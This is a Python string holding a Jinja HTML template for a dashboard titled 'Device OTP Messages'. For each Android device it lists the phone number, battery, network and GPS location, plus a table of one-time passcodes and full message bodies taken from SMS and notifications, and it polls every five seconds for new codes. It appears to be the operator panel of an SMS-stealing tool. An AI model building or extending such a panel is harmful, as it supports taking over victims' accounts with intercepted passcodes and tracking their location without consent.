# Device OTPs Page Template
DEVICE_OTPS_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Device OTPs - {{ device.device_id[:16] }}</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--primary:#4f46e5;--primary-light:#6366f1;--success:#10b981;--danger:#ef4444;--warning:#f59e0b;--bg:#f8fafc;--card:#fff;--text:#0f172a;--text-secondary:#475569;--text-muted:#64748b;--border:#e2e8f0;--border-light:#f1f5f9;--shadow:0 1px 3px rgba(0,0,0,.1),0 1px 2px rgba(0,0,0,.06);--shadow-md:0 4px 6px -1px rgba(0,0,0,.1),0 2px 4px -1px rgba(0,0,0,.06)}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;background:var(--bg);color:var(--text);line-height:1.6;min-height:100vh}
.container{max-width:1400px;margin:0 auto;padding:2rem}
.header{background:linear-gradient(135deg,var(--primary) 0%,#4338ca 100%);margin:-2rem -2rem 2rem;padding:2rem;border-radius:0 0 20px 20px;box-shadow:var(--shadow-md);color:#fff}
.back-btn{display:inline-flex;align-items:center;gap:.5rem;padding:.5rem 1rem;background:rgba(255,255,255,.2);border:1px solid rgba(255,255,255,.3);border-radius:8px;color:#fff;text-decoration:none;font-size:.875rem;font-weight:500;transition:all .2s}
.back-btn:hover{background:rgba(255,255,255,.3)}
.device-info-card{background:var(--card);border-radius:12px;padding:1.5rem;margin-bottom:2rem;box-shadow:var(--shadow)}
.device-header{display:flex;justify-content:space-between;align-items:start;margin-bottom:1rem;padding-bottom:1rem;border-bottom:2px solid var(--border-light)}
.device-title{font-size:1.5rem;font-weight:700}
.device-status{display:inline-flex;padding:.375rem .875rem;border-radius:16px;font-size:.75rem;font-weight:700}
.device-status.online{background:rgba(16,185,129,.1);color:var(--success);border:1px solid rgba(16,185,129,.2)}
.device-status.offline{background:rgba(239,68,68,.1);color:var(--danger);border:1px solid rgba(239,68,68,.2)}
.info-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:1rem}
.info-item{padding:1rem;background:var(--bg);border-radius:8px;border:1px solid var(--border-light)}
.info-label{font-size:.75rem;color:var(--text-secondary);font-weight:600;margin-bottom:.25rem;text-transform:uppercase}
.info-value{font-size:.9375rem;color:var(--text);font-weight:600}
.section{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.5rem;margin-bottom:2rem;box-shadow:var(--shadow)}
.section-title{font-size:1.25rem;font-weight:700;margin-bottom:1.5rem;padding-bottom:1rem;border-bottom:2px solid var(--border-light)}
.table-container{overflow-x:auto;border-radius:8px;border:1px solid var(--border)}
table{width:100%;border-collapse:collapse;background:var(--card)}
thead{background:var(--bg)}
th{padding:1rem 1.25rem;text-align:left;font-weight:600;font-size:.8125rem;color:var(--text-secondary);border-bottom:2px solid var(--border);text-transform:uppercase}
td{padding:1rem 1.25rem;border-bottom:1px solid var(--border-light);font-size:.875rem;color:var(--text-secondary)}
tbody tr:hover{background:var(--bg)}
.otp-code{font-family:'SF Mono',Monaco,Consolas,monospace;font-weight:700;font-size:1.125rem;color:var(--primary);letter-spacing:3px;padding:.625rem 1.25rem;background:rgba(79,70,229,.08);border-radius:8px;display:inline-block;border:1px solid rgba(79,70,229,.2)}
.badge{padding:.375rem .875rem;border-radius:16px;font-size:.75rem;font-weight:600}
.badge-sms{background:rgba(16,185,129,.1);color:var(--success);border:1px solid rgba(16,185,129,.2)}
.badge-notification{background:rgba(245,158,11,.1);color:var(--warning);border:1px solid rgba(245,158,11,.2)}
.message-preview{max-width:400px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.sender-name{font-weight:600;color:var(--text)}
.empty-state{text-align:center;padding:3rem;color:var(--text-muted)}
.map-link{color:var(--primary);text-decoration:none;font-weight:600}
.map-link:hover{text-decoration:underline}
</style>
</head>
<body>
<div class="container">
<div class="header">
<a href="/" class="back-btn">
<span>←</span>
<span>Back to Dashboard</span>
</a>
<h1 style="margin-top:1.5rem;font-size:1.875rem">Device OTP Messages</h1>
</div>

<div class="device-info-card">
<div class="device-header">
<div>
<div class="device-title">{{ device.device_manufacturer or '' }} {{ device.device_model or 'Unknown Device' }}</div>
<div style="margin-top:.5rem;font-size:.875rem;color:var(--text-secondary)">Device ID: {{ device.device_id[:16] }}...</div>
</div>
<span class="device-status {{ device.status_class }}">{{ device.status_label|upper }}</span>
</div>
<div class="info-grid">
<div class="info-item">
<div class="info-label">Phone Number</div>
<div class="info-value">{{ device.phone_number or 'N/A' }}</div>
</div>
<div class="info-item">
<div class="info-label">Battery</div>
<div class="info-value">{{ device.battery_level or 'N/A' }}% ({{ device.battery_status or 'N/A' }})</div>
</div>
<div class="info-item">
<div class="info-label">Network</div>
<div class="info-value">{{ device.network_type or 'N/A' }}</div>
</div>
<div class="info-item">
<div class="info-label">OS Version</div>
<div class="info-value">Android {{ device.os_version or 'N/A' }}</div>
</div>
{% if device.latitude and device.longitude %}
<div class="info-item">
<div class="info-label">Location</div>
<div class="info-value">
<a href="https://www.google.com/maps?q={{ device.latitude }},{{ device.longitude }}" target="_blank" class="map-link">
{{ "%.4f"|format(device.latitude) }}, {{ "%.4f"|format(device.longitude) }} →
</a>
</div>
</div>
{% endif %}
<div class="info-item">
<div class="info-label">Last Update</div>
<div class="info-value">{{ device.timestamp_formatted }} ({{ device.last_seen_relative }})</div>
</div>
</div>
</div>

<div class="section">
<h2 class="section-title">OTP Messages ({{ otps|length }})</h2>
<div class="table-container">
{% if otps %}
<table>
<thead>
<tr>
<th>OTP Code</th>
<th>Sender</th>
<th>Message</th>
<th>Source</th>
<th>Timestamp</th>
</tr>
</thead>
<tbody>
{% for otp in otps %}
<tr>
<td><span class="otp-code">{{ otp.otp_code }}</span></td>
<td><strong class="sender-name">{{ otp.sender }}</strong></td>
<td><div class="message-preview" title="{{ otp.message_body }}">{{ otp.message_body }}</div></td>
<td>
{% if 'sms' in otp.source %}
<span class="badge badge-sms">SMS</span>
{% elif 'notification' in otp.source %}
<span class="badge badge-notification">Notification</span>
{% else %}
<span class="badge">{{ otp.source }}</span>
{% endif %}
</td>
<td>{{ otp.time_display }}</td>
</tr>
{% endfor %}
</tbody>
</table>
{% else %}
<div class="empty-state">
<div style="font-size:3rem;opacity:.3">[ ]</div>
<h3 style="margin-top:1rem;color:var(--text)">No OTP Messages Yet</h3>
<p>OTP messages from this device will appear here</p>
</div>
{% endif %}
</div>
</div>

<div style="text-align:center;padding:1rem;color:var(--text-muted);font-size:.875rem">
Last updated: {{ current_time }}
</div>
</div>
<script>
let latestOtpCount = {{ otps|length }};
async function pollDeviceOtps(){
  try {
    const countResponse = await fetch('/api/otps?device_id={{ device.device_id }}&limit=500', {cache:'no-store'});
    if (!countResponse.ok) return;
    const countData = await countResponse.json();
    if (countData.count !== latestOtpCount) {
      window.location.reload();
    }
  } catch (error) {
    console.warn('OTP refresh failed', error);
  }
}
setInterval(pollDeviceOtps, 5000);
</script>
</body>
</html>
"""
